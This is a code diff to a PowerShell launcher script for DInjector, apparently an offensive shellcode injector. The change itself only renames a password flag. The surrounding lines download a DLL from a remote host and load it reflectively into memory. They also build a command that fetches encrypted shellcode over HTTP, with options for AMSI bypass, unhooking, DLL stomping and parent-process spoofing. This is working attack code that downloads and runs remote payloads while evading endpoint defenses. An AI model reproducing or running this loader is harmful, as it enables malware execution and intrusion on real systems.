@@ -32,7 +32,7 @@ $D = "DInjector.dll"
 # [/sc] encrypted shellcode filename
 $E = "enc"
 
-# [/password] password to decrypt the shellcode
+# [/p] password to decrypt the shellcode
 $F = "Passw0rd!"
 
 # [/protect] protection value that will be applied to the memory region where the shellcode resides ("RX" / "RWX", used in "currentthread")
@@ -96,7 +96,7 @@ if ($methods.Contains($A)) {
     }
 }
 
-$cmd = "${A} /sc:http://${B}:${C}/${E} /password:${F} /protect:${G} /timeout:${H} /flipSleep:${I} /image:${J} /pid:${K} /ppid:${L} /dll:${M} /stompDll:${N} /stompExport:${O} /sleep:${P} /blockDlls:${Q} /am51:${R} /unhook:${S}"
+$cmd = "${A} /sc:http://${B}:${C}/${E} /p:${F} /protect:${G} /timeout:${H} /flipSleep:${I} /image:${J} /pid:${K} /ppid:${L} /dll:${M} /stompDll:${N} /stompExport:${O} /sleep:${P} /blockDlls:${Q} /am51:${R} /unhook:${S}"
 
 $data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
 $assem = [System.Reflection.Assembly]::Load($data)
